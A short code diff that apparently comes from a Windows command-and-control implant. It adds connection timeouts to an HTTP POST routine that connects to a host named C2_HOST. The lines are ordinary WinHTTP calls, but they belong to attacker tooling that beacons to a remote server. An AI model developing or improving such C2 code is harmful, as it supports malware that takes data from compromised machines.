@@ -415,6 +415,7 @@ static char* http_post(const wchar_t *path, const char *data) {
                                       WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                       WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return NULL;
+    WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);
 
     HINTERNET hConnect = WinHttpConnect(hSession, C2_HOST, C2_PORT, 0);
     if (!hConnect) { WinHttpCloseHandle(hSession); return NULL; }
